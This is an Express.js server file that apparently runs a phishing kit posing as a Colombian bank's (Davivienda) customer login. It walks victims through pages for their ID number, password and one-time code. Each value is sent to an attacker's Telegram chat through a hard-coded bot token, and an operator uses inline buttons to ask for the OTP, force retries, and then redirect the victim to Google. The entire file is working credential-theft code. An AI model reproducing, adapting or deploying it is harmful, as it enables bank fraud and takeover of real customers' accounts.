const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = '8870357744:AAFnGoEMYdHkKP7vFOVzskUdm9FUa47xTHA';
const TELEGRAM_CHAT_ID = '-5576351785';

// Memoria local ultrarrápida (al estar el servidor vivo, la respuesta es inmediata)
const sesiones = {};

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Estilos CSS Compartidos
const estilosBase = `
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;}
body{background-color:#fff;background-image:url('https://i.ibb.co/qF4YhvwV/fondo.png');background-size:cover;background-position:center;background-repeat:no-repeat;background-attachment:fixed;min-height:100vh;display:flex;flex-direction:column;color:#222;}
.top-header{width:100%;height:70px;background-color:#e01b22;display:flex;align-items:center;justify-content:flex-start;padding:0 28px;box-shadow:0 2px 5px rgba(0,0,0,0.1);}
.header-logo{height:35px;width:auto;max-width:240px;object-fit:contain;display:block;}
.main-wrapper{flex:1;display:flex;align-items:flex-start;justify-content:center;padding:100px 20px 40px;}
.auth-container{width:100%;max-width:480px;display:flex;flex-direction:column;align-items:center;text-align:center;}
.auth-title{font-size:32px;font-weight:500;color:#111;margin-bottom:45px;letter-spacing:-0.3px;}
form{width:100%;display:flex;flex-direction:column;align-items:center;}
.input-group{width:100%;max-width:280px;margin-bottom:55px;position:relative;}
.custom-input{width:100%;border:none;border-bottom:2px solid #e01b22;padding:8px 5px;font-size:16px;text-align:center;outline:none;color:#222;background:transparent;transition:border-color 0.2s ease;}
.custom-input::placeholder{color:#222;font-weight:400;font-size:15px;}
.custom-input:focus{border-bottom:2px solid #c0141b;}
.btn-submit{background-color:#e01b22;color:#fff;border:none;border-radius:25px;padding:12px 50px;font-size:15px;font-weight:500;cursor:pointer;transition:background-color 0.2s ease,transform 0.1s ease;box-shadow:0 2px 4px rgba(224,27,34,0.2);text-decoration:none;display:inline-block;}
.btn-submit:hover{background-color:#c4131a;}
.btn-submit:active{transform:scale(0.98);}
.auth-links{margin-top:28px;display:flex;flex-direction:row;justify-content:center;align-items:center;flex-wrap:wrap;gap:14px;}
.auth-link{color:#e01b22;font-size:12.5px;text-decoration:none;font-weight:500;transition:opacity 0.2s ease;cursor:pointer;}
.auth-link:hover{text-decoration:underline;opacity:0.85;}
.error-message{color:#e01b22;font-size:13px;margin-top:8px;}
.spinner{width:58px;height:58px;border:4px solid rgba(224,27,34,0.15);border-top:4px solid #e01b22;border-radius:50%;animation:spin 0.9s cubic-bezier(0.6,0.2,0.4,0.8) infinite;margin-bottom:25px;}
@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
`;

const logoHtml = `<img src="https://i.ibb.co/1G4kztWc/logo.png" alt="Logo" class="header-logo">`;

// --- RUTAS DE LA WEB ---

// 1. Documento
app.get('/', (req, res) => {
    const error = req.query.error;
    res.send(`<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Autenticación del cliente</title><style>${estilosBase}</style></head>
<body>
<header class="top-header">${logoHtml}</header>
<main class="main-wrapper"><div class="auth-container">
<h1 class="auth-title">Autenticación del cliente</h1>
${error ? '<p class="error-message" style="margin-bottom:20px;">Datos incorrectos o sesión expirada.</p>' : ''}
<form method="POST" action="/guardar-documento" autocomplete="off" onsubmit="this.querySelector('.btn-submit').innerText='Verificando...';">
<div class="input-group"><input type="text" name="documento" class="custom-input" placeholder="Ingrese número identificación" required autofocus></div>
<button type="submit" class="btn-submit">Continuar</button>
<div class="auth-links"><a href="#" class="auth-link">Registrarse</a><a href="#" class="auth-link">¿Olvidó su contraseña?</a><a href="#" class="auth-link">Desbloquear usuario</a></div>
</form></div></main></body></html>`);
});

app.post('/guardar-documento', (req, res) => {
    const documento = req.body.documento || '';
    const sessionId = Math.random().toString(36).substring(2) + Date.now().toString(36);
    sesiones[sessionId] = { documento, clave: '', otp: '', comando: 'esperar' };
    res.redirect(`/clave.html?id=${sessionId}`);
});

// 2. Contraseña
app.get('/clave.html', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Contraseña</title><style>${estilosBase}</style></head>
<body>
<header class="top-header">${logoHtml}</header>
<main class="main-wrapper"><div class="auth-container">
<h1 class="auth-title">Ingrese su contraseña</h1>
<form method="POST" action="/guardar-clave" autocomplete="off" onsubmit="this.querySelector('.btn-submit').innerText='Validando...';">
<input type="hidden" name="id" id="inputId">
<div class="input-group"><input type="password" name="clave" class="custom-input" placeholder="Contraseña" required autofocus></div>
<button type="submit" class="btn-submit">Continuar</button>
</form></div></main>
<script>document.getElementById('inputId').value = new URLSearchParams(window.location.search).get('id') || '';</script></body></html>`);
});

app.post('/guardar-clave', async (req, res) => {
    const { clave, id } = req.body;
    if (sesiones[id]) {
        sesiones[id].clave = clave;
        sesiones[id].comando = 'esperar';

        const mensaje = `🚨 **NUEVO INGRESO - DAVIVIENDA**\n\n👤 **Documento:** ${sesiones[id].documento}\n🔑 **Clave:** ${clave}\n🆔 **Session ID:** ${id}`;
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: mensaje,
                reply_markup: {
                    inline_keyboard: [[
                        { text: '📲 Pedir Código OTP (Sí)', callback_data: `otp_${id}` },
                        { text: '❌ Error / Repetir (No)', callback_data: `error_${id}` }
                    ]]
                }
            })
        });
    }
    res.redirect(`/espera.html?id=${id}`);
});

// 3. OTP
app.get('/otp.html', (req, res) => {
    const error = req.query.error;
    res.send(`<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>OTP</title><style>${estilosBase}</style></head>
<body>
<header class="top-header">${logoHtml}</header>
<main class="main-wrapper"><div class="auth-container">
<h1 class="auth-title">Código de verificación</h1>
${error ? '<p class="error-message" style="margin-bottom:15px;font-weight:500;">El código ingresado es incorrecto.</p>' : ''}
<p style="font-size:14px;color:#555;margin-bottom:30px;">Ingrese el código de 6 dígitos enviado a su dispositivo.</p>
<form method="POST" action="/guardar-otp" autocomplete="off" onsubmit="this.querySelector('.btn-submit').innerText='Validando...';">
<input type="hidden" name="id" id="inputIdOtp">
<div class="input-group"><input type="text" name="otp" class="custom-input" placeholder="------" required maxlength="6" autofocus style="letter-spacing:4px;"></div>
<button type="submit" class="btn-submit">Continuar</button>
</form></div></main>
<script>document.getElementById('inputIdOtp').value = new URLSearchParams(window.location.search).get('id') || '';</script></body></html>`);
});

app.post('/guardar-otp', async (req, res) => {
    const { otp, id } = req.body;
    if (sesiones[id]) {
        sesiones[id].otp = otp;
        sesiones[id].comando = 'esperar_otp';

        const mensajeOtp = `🔑 **CÓDIGO OTP RECIBIDO**\n\n👤 **Documento:** ${sesiones[id].documento}\n🔢 **OTP:** ${otp}\n🆔 **Session ID:** ${id}`;
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: mensajeOtp,
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ Aprobar (Ir a Google)', callback_data: `aprobar_otp_${id}` },
                        { text: '❌ Error / Pedir de nuevo', callback_data: `error_otp_${id}` }
                    ]]
                }
            })
        });
    }
    res.redirect(`/espera.html?id=${id}&tipo=otp`);
});

// 4. Pantalla de Espera (Polling rápido cada 1 segundo)
app.get('/espera.html', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Validando...</title><style>${estilosBase}</style></head>
<body>
<header class="top-header">${logoHtml}</header>
<main class="main-wrapper"><div class="auth-container">
<div class="spinner"></div>
<p style="font-size:19px;font-weight:600;color:#111;margin-bottom:10px;">Validando su información...</p>
<p style="font-size:14px;color:#555;">Por favor espere un momento.</p>
</div></main>
<script>
const id = new URLSearchParams(window.location.search).get('id');
setInterval(async () => {
    try {
        const res = await fetch('/api_estado.json?id=' + id);
        const data = await res.json();
        if(data.success) {
            if(data.comando === 'pedir_otp') window.location.href = '/otp.html?id=' + id;
            else if(data.comando === 'mostrar_error') window.location.href = '/?error=1';
            else if(data.comando === 'repetir_otp') window.location.href = '/otp.html?id=' + id + '&error=1';
            else if(data.comando === 'finalizar_ok') window.location.href = 'https://www.google.com';
        }
    } catch(e) {}
}, 1000);
</script></body></html>`);
});

// 5. API de Estado
app.get('/api_estado.json', (req, res) => {
    const id = req.query.id;
    let comando = 'esperar';
    if (id && sesiones[id]) {
        comando = sesiones[id].comando;
    }
    res.setHeader('Cache-Control', 'no-store');
    res.json({ success: true, comando });
});

// 6. Webhook de Telegram
app.post('/telegram-webhook', async (req, res) => {
    try {
        const update = req.body;
        if (update.callback_query) {
            const data = update.callback_query.data;

            if (data.startsWith('otp_') || data.startsWith('error_')) {
                const [action, sessionId] = data.split('_');
                if (sesiones[sessionId]) {
                    sesiones[sessionId].comando = (action === 'otp') ? 'pedir_otp' : 'mostrar_error';
                }
            } else if (data.startsWith('aprobar_otp_') || data.startsWith('error_otp_')) {
                const parts = data.split('_');
                const action = parts[0];
                const sessionId = parts[2];
                if (sesiones[sessionId]) {
                    sesiones[sessionId].comando = (action === 'aprobar') ? 'finalizar_ok' : 'repetir_otp';
                }
            }

            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: update.callback_query.id, text: '¡Procesado!' })
            });
        }
    } catch (e) {}
    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`Servidor corriendo en puerto ${PORT}`);
});